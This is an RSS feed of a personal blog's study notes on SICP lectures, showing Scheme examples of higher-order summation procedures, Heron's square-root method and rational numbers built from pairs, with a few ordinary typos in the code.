<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Example Site</title><link>https://resyon.netlify.app/post/</link><description>Recent content in Posts on Example Site</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Tue, 02 May 2023 13:58:20 +0800</lastBuildDate><atom:link href="https://resyon.netlify.app/post/index.xml" rel="self" type="application/rss+xml"/><item><title>SICP_Lec_2b</title><link>https://resyon.netlify.app/p/sicp_lec_2b/</link><pubDate>Tue, 02 May 2023 13:58:20 +0800</pubDate><guid>https://resyon.netlify.app/p/sicp_lec_2b/</guid><description>&lt;h1 id="compound-data">Compound Data&lt;/h1>
&lt;h2 id="eg1-add-method-for-relational-number">eg.1 Add Method for Relational Number&lt;/h2>
&lt;p>Every realational number can be expressed by a fractional number.&lt;/p>
&lt;p>$$
x=\frac{m}{n},y=\frac{p}{q}, (x,y \in R;m,n,p,q\in Z)
$$
$$
x+y=\frac{mq+pn}{nq}
$$&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">+rat&lt;/span> &lt;span class="nv">x&lt;/span> &lt;span class="nv">y&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">make-rat&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">* &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">numer&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">denom&lt;/span> &lt;span class="nv">y&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">* &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">numer&lt;/span> &lt;span class="nv">y&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">denom&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">* &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">denom&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">denom&lt;/span> &lt;span class="nv">y&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="list-structure">List Structure&lt;/h2>
&lt;p>The feature can be used to implement make-rat.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; constructs a pair whose first part is x and whose second part is y.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">cons &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="nv">y&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">; =&amp;gt; [x, y]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; selects the first part of the pair p&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">car &lt;/span>&lt;span class="nv">p&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">; =&amp;gt; [x, y][0], aka x&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; selects the second part of the pair p&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">cdr &lt;/span>&lt;span class="nv">p&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">; =&amp;gt; [x, y][1], aka y&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>ATTENTION&lt;/strong>
&lt;code>cons&lt;/code> can constructs a pair no matter what the type of x, y&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">make-rat&lt;/span> &lt;span class="nv">n&lt;/span> &lt;span class="nv">d&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">cons &lt;/span>&lt;span class="nv">n&lt;/span> &lt;span class="nv">d&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">numer&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">car &lt;/span>&lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">denam&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">cdr &lt;/span>&lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="let">&lt;code>let&lt;/code>&lt;/h2>
&lt;p>use &lt;code>let&lt;/code> to define a local variable.&lt;/p></description></item><item><title>SICP_Lec_2a</title><link>https://resyon.netlify.app/p/sicp_lec_2a/</link><pubDate>Sun, 30 Apr 2023 20:21:15 +0800</pubDate><guid>https://resyon.netlify.app/p/sicp_lec_2a/</guid><description>&lt;h1 id="high-order-procedureiterative">High-Order Procedure(Iterative)&lt;/h1>
&lt;h2 id="eg1-sum-of-integer">eg.1 sum of integer&lt;/h2>
&lt;p>$$ \sum\nolimits_{i=a} ^{b}{i} $$&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; primitive procedure 1+ 1-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">soi&lt;/span> &lt;span class="nv">a&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">if &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">&amp;gt; &lt;/span>&lt;span class="nv">a&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">soi&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nv">+&lt;/span> &lt;span class="nv">a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nv">a&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="eg2-sum-of-square">eg.2 sum of square&lt;/h2>
&lt;p>$$ \sum\nolimits_{i=a}^{b}{i^2} $$&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">soq&lt;/span> &lt;span class="nv">a&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">square&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="nb">* &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">if &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">&amp;gt; &lt;/span>&lt;span class="nv">a&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">soi&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nv">+&lt;/span> &lt;span class="nv">a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">square&lt;/span> &lt;span class="nv">a&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="eg3-leibnitzs-formula">eg.3 Leibnitz&amp;rsquo;s formula&lt;/h2>
&lt;p>Following formula is designed to find value of&lt;/p>
&lt;p>$$
\frac{\pi}{8} =
\lim_{b\to+\infty}\sum\nolimits_{i=a;by4}^{b}\frac{1}{{i(i+1)}}
$$&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">pi-sum&lt;/span> &lt;span class="nv">a&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">if &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">&amp;gt; &lt;/span>&lt;span class="nv">a&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">pi-sum&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="mi">4&lt;/span> &lt;span class="nv">a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">/ &lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">* &lt;/span>&lt;span class="nv">a&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">+1&lt;/span> &lt;span class="nv">a&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="general-pattern-of-above-example">general pattern of above example&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">&amp;lt;name&amp;gt;&lt;/span> &lt;span class="nv">a&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">if &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">&amp;gt; &lt;/span>&lt;span class="nv">a&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">&amp;lt;name&amp;gt;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">&amp;lt;next&amp;gt;&lt;/span> &lt;span class="nv">a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">&amp;lt;handle&amp;gt;&lt;/span> &lt;span class="nv">a&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">sum&lt;/span> &lt;span class="nv">a&lt;/span> &lt;span class="nv">identity&lt;/span> &lt;span class="nv">next&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">if &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">&amp;gt; &lt;/span>&lt;span class="nv">a&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">sum&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">next&lt;/span> &lt;span class="nv">a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">identity&lt;/span> &lt;span class="nv">a&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">soi&lt;/span> &lt;span class="nv">a&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">identity&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">sum&lt;/span> &lt;span class="nv">identity&lt;/span> &lt;span class="nv">a&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="nv">+&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">soq&lt;/span> &lt;span class="nv">a&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">identity&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">* &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">sum&lt;/span> &lt;span class="nv">identity&lt;/span> &lt;span class="nv">a&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="nv">+&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="iterative">Iterative&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">sum&lt;/span> &lt;span class="nv">term&lt;/span> &lt;span class="nv">a&lt;/span> &lt;span class="nv">next&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">iter&lt;/span> &lt;span class="nv">j&lt;/span> &lt;span class="nv">ans&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">if &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">&amp;gt; &lt;/span>&lt;span class="nv">j&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">ans&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">iter&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">next&lt;/span> &lt;span class="nv">j&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">term&lt;/span> &lt;span class="nv">j&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">ans&lt;/span>&lt;span class="p">))))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">iter&lt;/span> &lt;span class="nv">a&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="eg4-heron-of-alexandrias-method">eg.4 Heron of Alexandria&amp;rsquo;s method&lt;/h2>
&lt;blockquote>
&lt;p>It is used to compute square roots.&lt;/p>
&lt;/blockquote>
&lt;p>It can be viewed as a iterative procedure finding a fixed point.&lt;/p>
&lt;p>Abstraction of this method:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">sqrt &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">fixed-point&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">lambda &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">y&lt;/span>&lt;span class="p">)&lt;/span>
